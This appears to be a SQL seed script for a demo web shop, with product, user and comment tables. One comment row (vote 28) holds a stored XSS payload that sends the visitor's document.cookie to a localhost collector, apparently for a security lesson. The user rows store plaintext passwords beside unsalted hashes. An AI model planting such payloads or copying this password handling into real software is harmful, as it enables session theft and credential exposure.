--(LocalDB)\MSSQLLocalDB
drop table Products;
CREATE TABLE Products
(
    [ProductID] INT NOT NULL PRIMARY KEY IDENTITY,
    [Name] NVARCHAR(100) NOT NULL,
    [Description] NVARCHAR(500) NOT NULL,
    [Category] NVARCHAR(50) NOT NULL,
    [Price] DECIMAL(16, 2) NOT NULL,
	[ImageData] VARBINARY (MAX) NULL,
    [ImageMimeType] VARCHAR (50)    NULL,
	[ImagePath] VARCHAR (512)    NULL
)

go

SET IDENTITY_INSERT [dbo].[Products] ON
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (1, N'活性碳口罩', N'可吸附有機氣體和毒性粉塵，但並不能有效的過濾空氣微粒和細菌，需費力呼吸或無法吸附異味時應立即更換，適用於噴漆作業或噴灑農藥時。', N'口罩', 20.5, null, 'image/png', 'img01.png')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (2, N'N95 口罩', N'N95 口罩主要是防嚴重病毒、重工業粉塵汙染，可阻擋 95% 以上次微米顆粒，因此在密合度、密閉性方面有特殊要求，呼吸阻抗較高配戴起來會比較悶，戴久了也容易缺氧、頭暈、呼吸困難。', N'口罩', 195, null, 'image/png', 'img02.png')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (3, N'PM2.5 防霾口罩', N'可有效防霧霾，阻隔 PM2.5、粉塵、懸浮粒子', N'口罩', 90, null, 'image/png', 'img03.png')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (4, N'海綿口罩', N'僅可阻隔較大型顆粒及大型飛沫、花粉，除了美觀之外，基本上沒有太大的用途', N'口罩', 30, null, 'image/png', 'img04.png')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (5, N'棉布口罩', N'僅能過濾較大之顆粒，可以作為保暖，避免灰頭土臉與鼻孔骯髒等用途，其優點是可以重覆清洗使用，反之，若未勤於清洗，反而容易孳生細菌。', N'口罩', 43, null, 'image/png', 'img05.png')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (6, N'紙口罩', N'可阻擋 75% 以上的五微米顆粒，需每天更換，破損或弄髒也要立刻丟掉。適合平時清潔工作時佩戴。', N'口罩', 10, null, 'image/png', 'img06.png')


INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (11, N'ASUS VivoBook14吋筆電', N'ASUS VivoBook S403FA 14吋窄邊框筆電 (i5-8265U8G/512G/Win10/玫瑰金)', N'筆電', 26900, null, 'image/jpeg', 'img11.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (12, N'MSI微星 GF75-068 17吋電競筆電', N'MSI微星 GF75-068 17吋電競筆電(i7-9750H/GTX1660Ti/8G)', N'筆電', 40900, null, 'image/jpeg', 'img12.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (13, N'MacBook Pro 13', N'全新2019 Apple MacBook Pro 13吋/i5/8G/256G/1.4GHz', N'筆電', 53900, null, 'image/jpeg', 'img13.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (14, N'Acer SF313-51-57NQ 13吋筆電', N'Acer SF313-51-57NQ 13吋筆電(i5-8250U/8G/256G) 追求輕薄外型者/想買Mac但預算不足者/需在外長時間使用者', N'筆電', 17900, null, 'image/jpeg', 'img14.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (15, N'Surface Go Pentium', N'Microsoft Surface Go Pentium 4415Y/4G/64G 商務版, 顯示器：10吋觸控螢幕', N'筆電', 14488, null, 'image/jpeg', 'img15.jpeg')


INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (21, N'Apple iPhone 11 64G 6.1吋智慧型手機', N'6.1 吋 全螢幕LCD IP68等級防潑、抗水與防塵 超廣角與廣角雙相機系統', N'手機', 24788, null, 'image/jpeg', 'img21.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (22, N'SAMSUNG Galaxy A71 (8G/128G)6.7吋輕旗艦四鏡', N'4G + 4G 雙卡雙待 前置 3,200 萬畫素鏡頭 螢幕指紋辨識、臉部解鎖 6.7 吋超大螢幕', N'手機', 13900, null, 'image/jpeg', 'img22.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (23, N'ASUS ROG Phone ZS600KL (8G/512G) 電競旗艦級手機', N'嚴選S845處理器 全球最快2.96Ghz 獨家3D液態均溫散熱系統 90Hz/1ms極速動態畫質 超音波觸控鍵遊戲反饋震動', N'手機', 13900, null, 'image/jpeg', 'img23.jpeg')
INSERT INTO [dbo].[Products] ([ProductID], [Name], [Description], [Category], [Price], [ImageData], [ImageMimeType], [ImagePath]) 
VALUES (24, N'SONY Xperia XZ3 (6G/64G) 6吋雙卡防水手機', N'XZ3手機螢幕是曲面弧度 輕薄的無邊框設計 / HDR OLED 顯示幕 / 立體聲擴音器', N'手機', 15599, null, 'image/jpeg', 'img24.jpeg')


SET IDENTITY_INSERT [dbo].[Products] OFF


drop table Users 
CREATE TABLE Users
(
    [UserID] INT NOT NULL PRIMARY KEY IDENTITY,
    [Email] VARCHAR(500) NOT NULL,
	FirstName NVARCHAR(100) NOT NULL,
	LastName NVARCHAR(100) NOT NULL,
    [Password] VARCHAR(640) NULL,
    [PasswordHash] VARCHAR(640) NULL,
    [PasswordSalt] VARCHAR(64),
	[IsAdmin] BIT NULL,
	Token VARCHAR(256),
	TokenCreTime DateTime
)
go

SET IDENTITY_INSERT [dbo].[Users] ON
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (1, N'admin@gss.com.tw', N'0000', convert(varchar(max),HASHBYTES('SHA2_256','0000'),2), NULL, 1, N'Admin', N'Ho');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (2, N'rm@gss.com.tw', N'0002', convert(varchar(max),HASHBYTES('SHA2_256','0002'),2), NULL, 0, N'Rainmaker', N'Ho');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (3, N'marty@gss.com.tw', N'0003', convert(varchar(max),HASHBYTES('SHA2_256','0003'),2), NULL, 0, N'Marty', N'Chen');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (4, N'tony@gss.com.tw', N'0004', convert(varchar(max),HASHBYTES('SHA2_256','0004'),2), NULL, 0, N'Tony', N'Ho');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (5, N'cindy@gss.com.tw', N'0005', convert(varchar(max),HASHBYTES('SHA2_256','0005'),2), NULL, 0, N'Cindy', N'Lin');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (6, N'eric@gss.com.tw', N'0006', convert(varchar(max),HASHBYTES('SHA2_256','0006'),2), NULL, 0, N'Eric', N'Lin');
INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (7, N'jenny@gss.com.tw', N'0007', convert(varchar(max),HASHBYTES('SHA2_256','0007'),2), NULL, 0, N'Jenny', N'Chang');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (8, N'rita@gss.com.tw', N'0008', convert(varchar(max),HASHBYTES('SHA2_256','0008'),2), NULL, 0, N'Rita', N'Chen');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (9, N'jack@gss.com.tw', N'0009', convert(varchar(max),HASHBYTES('SHA2_256','0009'),2), NULL, 0, N'Jack', N'Kao');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (10, N'jackly@gss.com.tw', N'0010', convert(varchar(max),HASHBYTES('SHA2_256','0010'),2), NULL, 0, N'Jackly', N'Lai');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (11, N'kenny@gss.com.tw', N'0011', convert(varchar(max),HASHBYTES('SHA2_256','0011'),2), NULL, 0, N'Kenny', N'Hsu');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (12, N'scar@gss.com.tw', N'0012', convert(varchar(max),HASHBYTES('SHA2_256','0012'),2), NULL, 0, N'Scar', N'Su');

INSERT INTO [dbo].[Users] ([UserID], [Email], [Password], [PasswordHash], [PasswordSalt], [IsAdmin], FirstName, LastName) 
VALUES (13, N'linda@gss.com.tw', N'0013', convert(varchar(max),HASHBYTES('SHA2_256','0013'),2), NULL, 0, N'Linda', N'Su');



SET IDENTITY_INSERT [dbo].[Users] OFF

 Drop Table Votes
CREATE TABLE Votes
(
	[VoteID] INT NOT NULL PRIMARY KEY IDENTITY,
	[ProductID] INT NOT NULL ,
    [UserID] INT NOT NULL ,   
    [Comments] NVARCHAR(MAX) NULL,
	[UserName] NVARCHAR(128) NULL
)
go

SET IDENTITY_INSERT [dbo].[Votes] ON
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(1, 1, 3, N'醫用的用不到，只好買這個 ＱＱ');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(2, 2, 3, N'這個請留給醫護人員使用');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(3, 3, 3, N'這個是台中人專用的嗎?');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(4, 4, 3, N'這個是造型用的嗎?');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(5, 5, 3, N'這個是造型用的嗎?');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(6, 6, 3, N'這個沒什麼用吧');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(7, 11, 3, N'玫瑰金 蠻好看的');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(8, 12, 3, N'17吋電競筆電，跟桌機一樣了');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(9, 13, 7, N'Apple MacBook Pro 13吋，好像會有14吋的');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(10, 14, 3, N'沒$$，只好先用這個');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(11, 15, 3, N'Surface window 平板');

INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(12, 1, 5, N'先撐著用這個');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(13, 2, 5, N'疑、N95居然有在賣?');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(14, 3, 5, N'這是大陸做的嗎');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(15, 4, 5, N'請問材質是什麼做的呢?');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(16, 5, 5, N'沒用吧，這個');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(17, 6, 5, N'不好用');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(18, 11, 5, N'零件會缺哦! 買了要小心哦!');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(19, 12, 5, N'這也太大了吧');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(20, 13, 5, N'a.. 買了才知道有新的 qq');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(21, 14, 5, N'文書機，還算ok啦');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(22, 15, 5, N'微軟的平板');


-- 活性碳口罩
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(23, 1, 4, N'還算透氣!');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(24, 21, 4, N'Apple 就是貴');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(25, 22, 4, N'3星 好像也不便宜');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(26, 23, 4, N'玩第5應該不會卡，不知傳說會不會卡');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(27, 24, 4, N'SONY 也便宜不到那去 ');

-- sony 手機
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(28, 24, 5, N'<script>location.href="http://localhost:53441/cookies/?c="+encodeURIComponent(document.cookie);</script>');


INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(29, 1, 6, N'Carbon mask');



INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(30, 13, 6, N'2019年的哦! 有點貴哦!');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(31, 13, 3, N'貴、太貴了...');

INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(32, 13, 13, N'這個好像是 2018 年舊款的哦!');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(33, 13, 8, N'我覺得...不行');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(34, 13, 12, N'別怕呀! 買下去就對了!');
INSERT INTO Votes (VoteID, ProductID, UserID, Comments)
VALUES(35, 13, 9, N'記得要多買保固哦!');

SET IDENTITY_INSERT [dbo].[Votes] OFF


